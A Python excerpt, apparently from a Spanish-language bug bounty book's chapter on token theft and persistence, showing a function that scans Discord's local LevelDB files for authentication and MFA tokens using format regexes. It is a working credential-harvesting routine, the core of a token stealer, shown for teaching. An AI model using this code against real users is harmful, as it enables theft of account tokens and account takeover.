# Extraído de: LibroBugBounty/cap-15-token-theft-persistencia.md
import re
from pathlib import Path

def extract_discord_token():
    """Extrae el token de Discord desde LevelDB."""
    leveldb_dir = (Path.home() / "AppData" / "Roaming"
                   / "discord" / "Local Storage" / "leveldb")

    if not leveldb_dir.exists():
        return None

    # Los tokens de Discord tienen formato específico
    token_pattern = re.compile(
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}'  # Token format
    )
    mfa_pattern = re.compile(
        r'mfa\.[\w-]{84}'  # MFA token format
    )

    tokens = []
    for ldb_file in leveldb_dir.glob("*.ldb"):
        try:
            content = ldb_file.read_bytes().decode('utf-8', errors='ignore')
            # Buscar tokens normales
            for match in token_pattern.finditer(content):
                tokens.append(("TOKEN", match.group()[:30] + "..."))
            # Buscar tokens MFA
            for match in mfa_pattern.finditer(content):
                tokens.append(("MFA_TOKEN", match.group()[:30] + "..."))
        except Exception:
            pass

    # También buscar en ficheros .log de LevelDB (WAL)
    # Los WAL pueden contener tokens que ya no están en SSTables
    for log_file in leveldb_dir.glob("*.log"):
        try:
            content = log_file.read_bytes().decode('utf-8', errors='ignore')
            for match in token_pattern.finditer(content):
                tokens.append(("TOKEN_LOG", match.group()[:30] + "..."))
        except Exception:
            pass

    return tokens
